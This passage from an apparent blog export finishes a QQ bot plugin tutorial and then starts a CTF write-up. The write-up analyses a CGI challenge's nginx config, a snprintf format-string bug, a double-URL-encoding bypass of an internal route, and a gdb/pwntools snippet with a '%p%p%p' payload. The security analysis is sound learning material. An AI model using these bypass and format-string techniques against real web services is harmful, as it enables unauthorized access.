class="property">message_id</span>)</span><br><span class="line">              e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">          &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">count</span>(e, <span class="string">&quot;send&quot;</span>, msg)</span><br><span class="line">      <span class="keyword">return</span> res</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<h6 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">async</span> (msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p><code>msg</code>: 要发送的消息，默认值是空字符串。</p>
</li>
<li><p><code>quote</code>: 是否引用消息（通常用于回复特定消息），默认值为 <code>false</code>。</p>
</li>
<li><p><code>data</code>: 一个对象，包含额外的选项，包括：</p>
<ul>
<li><code>recallMsg</code>: 是否自动撤回消息，单位是秒（默认值为 <code>0</code>，即不撤回）。</li>
<li><code>at</code>: 是否 @ 某人。可以是用户 ID，也可以是 <code>true</code>（表示 @ 当前消息发送者）。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="at-和-quote-功能的处理"><a href="#at-和-quote-功能的处理" class="headerlink" title="at 和 quote 功能的处理"></a><strong><code>at</code> 和 <code>quote</code> 功能的处理</strong></h6><p><strong>@ 功能 (<code>at</code>)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (at &amp;&amp; e.<span class="property">isGroup</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (at === <span class="literal">true</span>)</span><br><span class="line">    at = e.<span class="property">user_id</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">    msg.<span class="title function_">unshift</span>(segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    msg = [segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>, msg]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>如果传入了 <code>at</code>且当前消息是群消息：</p>
<ul>
<li>如果 <code>at === true</code>，则默认 @ 当前用户 <code>e.user_id</code>。</li>
<li>如果消息内容是数组，会在数组前添加 <code>@</code> 信息和换行符。</li>
<li>如果消息是普通文本，则将消息包装成一个数组并加上 <code>@</code> 信息。</li>
</ul>
</li>
</ul>
<hr>
<p><strong>引用消息 (<code>quote</code>)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (quote &amp;&amp; e.<span class="property">message_id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">    msg.<span class="title function_">unshift</span>(segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>))</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    msg = [segment.<span class="title function_">reply</span>(e.<span class="property">message_id</span>), msg]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>如果 <code>quote</code>为<code>true</code>且当前事件中有 <code>message_id</code>：</p>
<ul>
<li>在消息前添加一段引用内容（<code>segment.reply(e.message_id)</code>）。</li>
<li>类似 <code>at</code> 的逻辑，会将消息转换为数组格式。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="消息发送与异常处理"><a href="#消息发送与异常处理" class="headerlink" title="消息发送与异常处理"></a><strong>消息发送与异常处理</strong></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  res = <span class="keyword">await</span> <span class="title function_">reply</span>(msg)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="title class_">Bot</span>.<span class="title function_">makeLog</span>(<span class="string">&quot;error&quot;</span>, [<span class="string">&quot;发送消息错误&quot;</span>, msg, err], e.<span class="property">self_id</span>)</span><br><span class="line">  res = &#123; <span class="attr">error</span>: [err] &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>使用 <code>reply(msg)</code> 发送消息。</li>
<li>如果发送失败，会捕获异常，并通过 <code>Bot.makeLog</code> 记录错误日志。</li>
</ul>
<hr>
<h6 id="自动撤回消息"><a href="#自动撤回消息" class="headerlink" title="自动撤回消息"></a><strong>自动撤回消息</strong></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (recallMsg &gt; <span class="number">0</span> &amp;&amp; res?.<span class="property">message_id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">group</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">        e.<span class="property">group</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">    &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">friend</span>?.<span class="property">recallMsg</span>)</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(res.<span class="property">message_id</span>)</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">message_id</span>)</span><br><span class="line">        e.<span class="property">friend</span>.<span class="title function_">recallMsg</span>(e.<span class="property">message_id</span>)</span><br><span class="line">    &#125;, recallMsg * <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>如果 <code>recallMsg</code> 大于 0 且成功发送了消息（<code>res?.message_id</code>存在）：</p>
<ul>
<li>如果消息是在群聊中发送，调用 <code>e.group.recallMsg</code> 撤回消息。</li>
<li>如果消息是在私聊中发送，调用 <code>e.friend.recallMsg</code> 撤回消息。</li>
<li><code>setTimeout</code> 用来延迟 <code>recallMsg</code> 秒后执行撤回操作。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="统计与返回"><a href="#统计与返回" class="headerlink" title="统计与返回"></a><strong>统计与返回</strong></h6><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">count</span>(e, <span class="string">&quot;send&quot;</span>, msg)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></div>
<ul>
<li>调用 <code>this.count</code> 方法统计消息发送（如记录发送次数）。</li>
<li>最后返回消息发送的结果 <code>res</code>。</li>
</ul>
<p>这样我们就可以尝试着手实现一个简单的功能改造了，这个自带的复读文件需要我们输入<code>#复读</code>，然后bot回应后我们再输入内容，bot才会复读该内容。那么我们可以尝试将其改造成一个我们@bot后输入复读xxx，然后bot复读xxx的一个功能插件。</p>
<p>在更改的过程中发现了一个严峻的问题，就是其rule中reg的正则匹配只返回了true或false，但并不能捕获分组。这里我们可以在函数体内部再进行一次正则表达的匹配，然后进行输出。</p>
<p>在测试中也发现，我们@bot的这个前缀实际不会出现在e.msg中，只用匹配后面的内容就行。</p>
<p>最终更改结果：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">example2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">plugin</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;复读&quot;</span>,</span><br><span class="line">      <span class="attr">dsc</span>: <span class="string">&quot;复读用户发送的内容&quot;</span>,</span><br><span class="line">      <span class="comment">/** https://oicqjs.github.io/oicq/#events */</span></span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">priority</span>: <span class="number">5000</span>,</span><br><span class="line">      <span class="attr">rule</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/** 命令正则匹配 */</span></span><br><span class="line">          <span class="attr">reg</span>: <span class="string">&quot;^复读:(.*)$&quot;</span>,</span><br><span class="line">          <span class="comment">/** 执行方法 */</span></span><br><span class="line">          <span class="attr">fnc</span>: <span class="string">&quot;repeat&quot;</span>,</span><br><span class="line">          <span class="attr">permission</span>: <span class="string">&quot;all&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  repeat = <span class="title function_">async</span> () =&gt;&#123;</span><br><span class="line">    <span class="comment">// const content = this.e.match[1].trim();</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">rule</span>); <span class="comment">// 打印 this.rule 的值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">rule</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>] &amp;&amp; <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span> = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>);</span><br><span class="line">      <span class="keyword">const</span> match = <span class="variable language_">this</span>.<span class="property">rule</span>[<span class="number">0</span>].<span class="property">reg</span>.<span class="title function_">exec</span>(<span class="variable language_">this</span>.<span class="property">e</span>.<span class="property">msg</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(match);</span><br><span class="line">      <span class="keyword">if</span> (match) &#123;</span><br><span class="line">        <span class="keyword">const</span> content = match[<span class="number">1</span>].<span class="title function_">trim</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(content, <span class="literal">false</span>, &#123; <span class="attr">at</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;No match found&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;rule or reg is undefined&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>qqbot</category>
      </categories>
      <tags>
        <tag>yunzai</tag>
        <tag>JS</tag>
        <tag>OneBot</tag>
      </tags>
  </entry>
  <entry>
    <title>webpwn</title>
    <url>/blog/2024/09/21/webpwn/</url>
    <content><![CDATA[<h2 id="一、web与pwn的联系"><a href="#一、web与pwn的联系" class="headerlink" title="一、web与pwn的联系"></a>一、web与pwn的联系</h2><p>在某些 Web 服务中，会通过调用二进制程序来处理特定请求，尤其是在涉及动态内容生成、脚本执行、数据处理等场景时。以下是一些常见的例子：</p>
<h4 id="1-CGI-Common-Gateway-Interface"><a href="#1-CGI-Common-Gateway-Interface" class="headerlink" title="1. CGI (Common Gateway Interface)"></a>1. <strong>CGI (Common Gateway Interface)</strong></h4><ul>
<li><strong>概述：</strong> CGI 是一种通用的接口标准，允许 Web 服务器调用外部的二进制程序或脚本来生成动态内容。</li>
<li><strong>调用方式：</strong> 当用户请求特定路径时，Web 服务器会通过 CGI 将请求转发给二进制程序（例如 C/C++ 编写的可执行文件）。程序运行后将生成的输出（通常是 HTML）返回给用户。</li>
<li><strong>示例：</strong> <code>httpd</code>、<code>nginx</code> 等服务器常通过 CGI 调用二进制文件，如 <code>/usr/lib/cgi-bin/</code> 中的程序。</li>
</ul>
<h4 id="2-FastCGI"><a href="#2-FastCGI" class="headerlink" title="2. FastCGI"></a>2. <strong>FastCGI</strong></h4><ul>
<li><strong>概述：</strong> FastCGI 是 CGI 的增强版，通常用于调用长时间运行的二进制程序或脚本，以提高性能。</li>
<li><strong>调用方式：</strong> Web 服务器将请求传递给 FastCGI 进程，该进程是一个长期运行的二进制程序，能快速处理多个请求，而不必每次请求都重新启动程序。</li>
<li><strong>示例：</strong> PHP-FPM 就是一个常见的 FastCGI 进程管理器，它可以调用 PHP 解释器来处理请求。</li>
</ul>
<h4 id="3-后端服务调用"><a href="#3-后端服务调用" class="headerlink" title="3. 后端服务调用"></a>3. <strong>后端服务调用</strong></h4><ul>
<li><strong>概述：</strong> 有些 Web 服务会在后台调用二进制程序来执行任务，例如图像处理、数据分析、或其他复杂计算。</li>
<li><strong>调用方式：</strong> 通常通过系统调用（如 <code>exec</code> 或 <code>popen</code>）从 Web 应用程序（如 Python、Ruby、PHP 等）中调用二进制程序，并获取其输出结果。</li>
<li><strong>示例：</strong> 图像处理库 ImageMagick 或者 FFMPEG 等工具经常在 Web 服务中被调用来处理用户上传的媒体文件。</li>
</ul>
<h4 id="4-嵌入式设备-Web-服务"><a href="#4-嵌入式设备-Web-服务" class="headerlink" title="4. 嵌入式设备 Web 服务"></a>4. <strong>嵌入式设备 Web 服务</strong></h4><ul>
<li><strong>概述：</strong> 在一些嵌入式系统（如路由器、NAS 设备等）中，Web 界面通常用于配置设备，而这些界面可能会调用二进制程序来执行系统命令或获取状态信息。</li>
<li><strong>调用方式：</strong> 嵌入式设备的 Web 服务器可能直接调用设备上的二进制文件来执行配置变更或获取系统状态。</li>
<li><strong>示例：</strong> 路由器的管理界面可能调用二进制程序来重启设备或修改网络设置。</li>
</ul>
<h4 id="5-Server-Side-Includes-SSI"><a href="#5-Server-Side-Includes-SSI" class="headerlink" title="5. Server-Side Includes (SSI)"></a>5. <strong>Server-Side Includes (SSI)</strong></h4><ul>
<li><strong>概述：</strong> SSI 是一种服务器端技术，允许在 HTML 文件中包含其他文件或执行命令行程序。</li>
<li><strong>调用方式：</strong> 通过 SSI，可以在 HTML 中直接调用二进制程序，并将其输出嵌入到页面中。</li>
<li><strong>示例：</strong> 例如，在 Apache 中，可以通过 <code>&lt;!--#exec cmd=&quot;path/to/program&quot;--&gt;</code> 来调用一个二进制程序并将其输出嵌入到 HTML 中。</li>
</ul>
<p>调用二进制程序的 Web 服务在动态内容生成和复杂任务处理时非常有用，尤其是在需要高效处理和利用已有二进制工具的情况下。使用这些技术时，可能会产生二进制的漏洞。</p>
<h2 id="二、题目复现"><a href="#二、题目复现" class="headerlink" title="二、题目复现"></a>二、题目复现</h2><h3 id="1-gateway"><a href="#1-gateway" class="headerlink" title="1.gateway"></a>1.gateway</h3><p>以CGI产生的漏洞进行分析，这里分析时比较重要的是要在default文件里看Nginx配置信息。</p>
<h4 id="Nginx配置信息"><a href="#Nginx配置信息" class="headerlink" title="Nginx配置信息"></a>Nginx配置信息</h4><div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line"><span class="attribute">listen</span> [::]:<span class="number">80</span> default_server;</span><br><span class="line"><span class="attribute">root</span> /var/www/html;</span><br><span class="line"><span class="attribute">index</span> index.html index.htm index.nginx-debian.html;</span><br><span class="line"><span class="attribute">server_name</span> _;</span><br></pre></td></tr></table></figure></div>
<p><strong>listen 80 default_server;</strong></p>
<ul>
<li>配置 Nginx 监听 <code>80</code> 端口，这是默认的 HTTP 端口。</li>
<li><code>default_server</code> 表示这是默认的服务器块，当请求的主机名没有匹配到其他服务器块时，将使用此服务器块。</li>
</ul>
<p><strong>listen [::]:80 default_server;</strong></p>
<ul>
<li>这个指令与上面的类似，但它用于监听 IPv6 地址上的 <code>80</code> 端口。</li>
</ul>
<p><strong>root /var/www/html;</strong></p>
<ul>
<li>定义服务器的根目录。当请求的 URI 没有指向具体文件时，Nginx 会在此目录中查找资源。</li>
</ul>
<p><strong>index index.html index.htm index.nginx-debian.html;</strong></p>
<ul>
<li>定义默认的主页文件列表。当用户访问一个目录时，Nginx 会依次查找这些文件作为首页。</li>
</ul>
<p><strong>server<em>name </em>;</strong></p>
<ul>
<li>设置服务器名。_ 表示匹配任何请求的服务器名。</li>
</ul>
<div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">    <span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /cgi-bin/note_handler &#123;</span><br><span class="line">    internal;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="number">127.0.0.1</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="section">location</span> /cgi-bin/ &#123;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$uri</span> = <span class="string">&quot;/cgi-bin/note_handler&quot;</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">expires</span> +<span class="number">1h</span>;</span><br><span class="line">    <span class="attribute">limit_rate</span> <span class="number">10k</span>;</span><br><span class="line">    <span class="attribute">root</span> /usr/share;</span><br><span class="line">    <span class="attribute">fastcgi_pass</span> unix:/var/run/fcgiwrap.socket;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> /cgi-bin/http;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/fastcgi_params;</span><br><span class="line">    <span class="comment">#fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span></span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span>/cgi-bin/http;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /cgi-bin/forward &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="number">127.0.0.1</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1/cgi-bin/http?action=print;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> /get_flag &#123;</span><br><span class="line">    <span class="attribute">alias</span> /tmp/flag;</span><br><span class="line">    <span class="attribute">default_type</span> text/plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>location / { … }</strong></p>
<ul>
<li>这个 <code>location</code> 块用于定义如何处理根路径 <code>/</code> 下的请求。<ul>
<li><code>try_files $uri $uri/ =404;</code>：首先尝试按文件路径处理请求，如果找不到相应的文件或目录，则返回 <code>404</code> 错误。</li>
</ul>
</li>
</ul>
<p><strong>location /cgi-bin/note_handler { … }</strong></p>
<ul>
<li>这个 <code>location</code> 块内部处理 <code>/cgi-bin/note_handler</code> 的请求，并通过 <code>proxy_pass</code> 将请求转发到 <code>http://127.0.0.1</code>。<ul>
<li><code>internal;</code>：这个指令表示该路径是内部路径，不能直接从外部访问。</li>
<li><code>proxy_set_header</code> 设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>，通常用于标识原始请求的 IP 地址。</li>
</ul>
</li>
</ul>
<p><strong>location /cgi-bin/ { … }</strong></p>
<ul>
<li>这个块定义了对 <code>/cgi-bin/</code> 目录下的请求的处理。<ul>
<li><code>if ($uri = &quot;/cgi-bin/note_handler&quot;) &#123; return 403; &#125;</code>：如果请求的 URI 是 <code>/cgi-bin/note_handler</code>，则返回 <code>403 Forbidden</code>。</li>
<li><code>expires +1h;</code>：设置响应缓存时间为1小时。</li>
<li><code>limit_rate 10k;</code>：限制响应速率为 <code>10KB/s</code>。</li>
<li><code>root /usr/share;</code>：定义此块的根目录为 <code>/usr/share</code>。</li>
<li><code>fastcgi_pass</code> 和 <code>fastcgi_index</code> 指定了 FastCGI 处理脚本的位置。</li>
<li><code>include /etc/nginx/fastcgi_params;</code> 包含了 FastCGI 的标准配置文件。</li>
<li><code>fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;</code>：设置 <code>SCRIPT_FILENAME</code> 参数，指定 CGI 脚本的路径。</li>
</ul>
</li>
</ul>
<p><strong>location /cgi-bin/forward { … }</strong></p>
<ul>
<li>这个块处理 <code>/cgi-bin/forward</code> 请求，并将其代理到 <code>http://127.0.0.1/cgi-bin/http?action=print</code>。<ul>
<li><code>proxy_set_header X-Forwarded-For 127.0.0.1;</code>：设置了 <code>X-Forwarded-For</code> 头部为 <code>127.0.0.1</code>。</li>
<li><code>proxy_pass http://127.0.0.1/cgi-bin/http?action=print;</code>：将请求代理到指定的 URL。</li>
</ul>
</li>
</ul>
<p><strong>location /get_flag { … }</strong></p>
<ul>
<li>这个块处理 <code>/get_flag</code> 请求。<ul>
<li><code>alias /tmp/flag;</code>：将请求 <code>/get_flag</code> 映射到 <code>/tmp/flag</code> 文件。</li>
<li><code>default_type text/plain;</code>：将响应的内容类型设置为 <code>text/plain</code>。</li>
</ul>
</li>
</ul>
<h4 id="cgi脚本信息"><a href="#cgi脚本信息" class="headerlink" title="cgi脚本信息"></a>cgi脚本信息</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212314836.png"
                      class=""
                >
<p>先是通过三个getenv函数获取环境变量。如果我们发起如下的请求</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/cgi-bin/script?param1=value1&amp;param2=value2</span><br></pre></td></tr></table></figure></div>
<p>该请求的参数会加入到服务器的环境变量，具体的环境变量值如下：</p>
<ul>
<li><code>REQUEST_METHOD</code>：<code>GET</code></li>
<li><code>QUERY_STRING</code>：<code>param1=value1&amp;param2=value2</code></li>
<li><code>SCRIPT_NAME</code>：<code>/cgi-bin/script</code></li>
</ul>
<p>后续的几个判断就是限制了各参数的长度，以及限制了用..来进行目录穿越的手段。其中比较重要的就是这个url_decode函数，其作用是进行url解码，也正是这个函数结合Nginx服务器的配置产生了漏洞。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212329176.png"
                      class=""
                >
<p>后续先对请求方式进行判断，如果不是GET的话最后会返回<code>&lt;html&gt;&lt;title&gt;403 FORBIDDEN&lt;/title&gt;&lt;body&gt;Method not support.&lt;/body&gt;&lt;/html&gt;</code>这样的页面。后面的循环实现了逐个取出get的参数，其中解析了action以及content这两个参数。而最主要的漏洞也就是发生在content参数会用<code>snprintf(v14, (size_t)&quot;%s&quot;, content, v6);</code>来处理，这个函数的参数设置产生了错误，导致格式化字符串%s被当成了一个数字大小来作为存到v14缓冲区的字节数量，而content也就成了解析的格式化字符串，于是产生了格式化字符串漏洞。</p>
<p>然后我们来看看前面有个check函数，这个函数也就是我们需要构造条件来绕过的一个检测函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212338234.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212346893.png"
                      class=""
                >
<p>我们发现这里主要做了两个检测，也就是<strong>X-Forwarded-For</strong>这个http请求头字段要为127.0.0.1。而且s1，也就是之前获取的cgi脚本路径要为<strong>/cgi-bin/note_handler</strong>。然而之前在nginx配置中/cgi-bin/note_handler有用<strong>internal</strong>来指定其不能被外部请求访问，绕不开这个就不能进行下一步利用，这该怎么办呢？这时候前面的<strong>url_decode</strong>就起了作用，我们可以把/cgi-bin/note_handler转成其url编码的形式传入（其实只用编码一个字符就能够绕过检测），此时能够通过如上check函数，因为s1是解码后的url。这里需要注意的是，由于http请求到达nginx服务器时会<strong>先进行一次url解码</strong>，所以如果我们想要把r进行url编码，直接转成%72是不够的，因为一开始它就被解码然后进location块而过不了检测。我们需要再把%也进行url编码，把r转成%2572输入，那么cgi程序最后调用url_decode后就得到了我们想要的/cgi-bin/note_handler。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212357022.png"
                      class=""
                >
<p>然后就是处理程序的主体逻辑了，使用之前与处理get参数相同的for循环来逐个获取以逗号分割的指令，实现了一个类似堆菜单题的操作。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212405705.png"
                      class=""
                >
<p>从这个add方法中可以看出，每个add的chunk中都有一个指向下一个节点的next域（<code>*((_QWORD *)dest + 13)</code>这个位置），全局变量dest存的是头节点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212414590.png"
                      class=""
                >
<p>由于是每次释放掉链表头节点，每次都会更新头节点，所以不会有悬挂指针，就不存在UAF。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212422128.png"
                      class=""
                >
<p>edit功能没啥用，改的内容和原来content里的内容相同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212430271.png"
                      class=""
                >
<p>print会遍历整个链表，可以展示每个节点的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212438450.png"
                      class=""
                >
<p>get_flag就是一个后门函数，不过这里把获取到flag的内容重定向到/dev/null丢弃了，直接调用也不会显示flag内容。</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><h5 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h5><p>由于在CGI环境中，Web服务器（如Nginx）会将HTTP请求中的某些信息解析并传递给运行的CGI程序作为环境变量。我们这里看到的参数都是通过getenv传递的。所以如果我们像正常做pwn题那样直接对二进制程序进行分析，会发现少了服务器将http请求解析到环境变量这一环节，这时我们需要寻求别的方式来进行调试。</p>
<p>解决方法其实也很容易想到，既然是getenv加载参数，那么我们可以在gdb中直接来设置环境变量，这样之后就是正常的本地环境漏洞分析了。需要注意的是，本地在设置环境变量时都是模拟服务器处理后的参数，比如我们要传<strong>/cgi-bin/note_handle%2572</strong>，在调试时就要经过一层url解码，传入的是<strong>/cgi-bin/note_handle%72</strong>。</p>
<p>大致的调试方法如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./http&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;action=add,print&amp;content=%p%p%p&quot;</span></span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        set env REQUEST_METHOD GET</span></span><br><span class="line"><span class="string">        set env QUERY_STRING &quot;<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="string">        set env SCRIPT_NAME /cgi-bin/note_handle%72</span></span><br><span class="line"><span class="string">        set env HTTP_X_FORWARDED_FOR 127.0.0.1</span></span><br><span class="line"><span class="string">        b getenv</span></span><br><span class="line"><span class="string">        r</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>这时我们可能会遇到如下问题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212450571.png"
                      class=""
                >
<p>首先猜测是地址对其的问题，这里rsi的值为0x7fffffffef86，rsi+rdx-0x40不是16字节对齐的，我们看看0x7fffffffef86附近的内存布局：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212457536.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212504437.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212510945.png"
                      class=""
                >
<p>可以发现这个getenv返回的是一个指向环境变量地址的指针，而且环境变量依次存在这个栈段的高地址处。我们可以尝试构造环境变量时使其大小刚好满足对齐条件试试。我首先是尝试把query_string那个环境变量变长从而把后面的script_name弄对齐，但是发现不会改变script_name值的位置。那么就猜测这个环境变量是从高地址往低地址存的，换一下环境变量设置的顺序后再改payload长度。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
